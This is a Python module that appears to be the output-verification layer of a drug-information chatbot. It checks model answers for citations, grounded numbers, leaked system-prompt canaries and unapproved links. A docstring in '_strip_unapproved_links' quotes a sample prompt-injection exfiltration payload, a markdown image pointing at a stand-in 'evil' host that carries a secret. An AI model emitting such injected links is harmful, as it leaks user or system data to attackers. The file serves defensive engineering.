"""Layer 4: verify the model's answer BEFORE the user sees it. Pure code.

Failing closed: if any check fails, the user gets a safe canned reply, never the raw model text.
"""
import re
from dataclasses import dataclass, field
from decimal import Decimal, InvalidOperation

from app.guardrails import messages
from app.guardrails.prompts import CANARY

_CITATION = re.compile(r"\[([ST]\d+)\]")
_MD_IMAGE = re.compile(r"!\[[^\]]*\]\([^)]*\)")
_MD_LINK = re.compile(r"\[([^\]]+)\]\(([^)]+)\)")
_BARE_URL = re.compile(r"https?://[^\s)\]>]+")
_MONEY = re.compile(r"\$\s?(\d[\d,]*(?:\.\d+)?)")
_PERCENT = re.compile(r"(\d+(?:\.\d+)?)\s?%")
_BARE_NUMBER = re.compile(r"(?<![\w.])(\d+(?:\.\d+)?)(?![\w])")


@dataclass(frozen=True)
class OutputVerdict:
    ok: bool
    text: str                                    # what the user should see
    citations: list[str] = field(default_factory=list)
    reason: str | None = None                    # why it was blocked (for logs / debug panel)


def _numbers(pattern: re.Pattern, text: str) -> set[Decimal]:
    out = set()
    for m in pattern.finditer(text):
        try:
            out.add(Decimal(m.group(1).replace(",", "")))   # $5 and $5.00 compare equal
        except InvalidOperation:
            pass
    return out


def _strip_unapproved_links(answer: str, allowed_urls: set[str]) -> str:
    """Links/images are a data-exfiltration channel (an injected '![x](https://evil/?d=SECRET)').
    The UI renders citations itself, so anything not on the approved-URL list is removed."""
    answer = _MD_IMAGE.sub("", answer)
    answer = _MD_LINK.sub(lambda m: m.group(0) if m.group(2) in allowed_urls else m.group(1), answer)
    return _BARE_URL.sub(lambda m: m.group(0) if m.group(0) in allowed_urls else "", answer)


def _strip_echoed_fixed_text(text: str) -> str:
    """The model sometimes pastes one of our fixed messages INSIDE a longer answer (e.g. the refusal sentence).
    Code adds the disclaimer/notice exactly once, so remove any echoes (optionally wrapped in markdown * or _)."""
    for fixed in (messages.NOT_A_DOCTOR, messages.DRUG_INFO_NOTICE, messages.FOOTER):
        text = re.sub(r"[*_]{0,2}\s*" + re.escape(fixed) + r"\s*[*_]{0,2}", " ", text)
    text = re.sub(r"\n\s*-{3,}\s*$", "", text.strip())         # a dangling '---' rule left behind
    return re.sub(r"\n{3,}", "\n\n", text).strip()


def check_output(answer: str, allowed_ids: set[str], allowed_urls: set[str],
                 source_text: str, notice: str | None = None) -> OutputVerdict:
    """allowed_ids: ids of the blocks actually given to the model, e.g. {"S1","S2","T1"}.
    source_text: the concatenated text of those blocks (used to verify numbers).
    notice: optional fixed disclaimer inserted (in code) before the standard footer."""
    text = (answer or "").strip()

    if not text:
        return OutputVerdict(False, messages.NO_INFO, reason="empty_answer")

    if CANARY in text:                                       # system prompt leaked
        return OutputVerdict(False, messages.REFUSED_REQUEST, reason="prompt_leak")

    if text in messages.CANNED:                              # the model chose a fixed reply
        return OutputVerdict(True, text)

    text = _strip_echoed_fixed_text(_strip_unapproved_links(text, allowed_urls))
    if not text:
        return OutputVerdict(False, messages.NO_INFO, reason="empty_answer")

    cited = list(dict.fromkeys(_CITATION.findall(text)))     # unique, in order of appearance
    if not cited:
        return OutputVerdict(False, messages.NO_INFO, reason="uncited_answer")
    invalid = [c for c in cited if c not in allowed_ids]
    if invalid:
        return OutputVerdict(False, messages.NO_INFO, reason=f"invented_citation:{','.join(invalid)}")

    # Hallucination check: every dollar amount / percentage in the answer must appear in the sources.
    #  * dollar amounts must appear WITH a "$" (our tools format money that way)
    #  * percentages need only the NUMBER to appear: FDA label tables print "3.5" under a "(%)" column header,
    #    so demanding a literal "3.5%" would wrongly block correct quotes. A wrong number is still caught.
    checks = (("dollar_amount", _numbers(_MONEY, text), _numbers(_MONEY, source_text)),
              ("percentage", _numbers(_PERCENT, text), _numbers(_BARE_NUMBER, source_text)))
    for name, in_answer, in_sources in checks:
        ungrounded = in_answer - in_sources
        if ungrounded:
            shown = ",".join(sorted(str(n) for n in ungrounded))
            return OutputVerdict(False, messages.NO_INFO, reason=f"ungrounded_{name}:{shown}")

    parts = [text] + ([notice] if notice else []) + [messages.FOOTER]
    return OutputVerdict(True, "\n\n".join(parts), citations=cited)
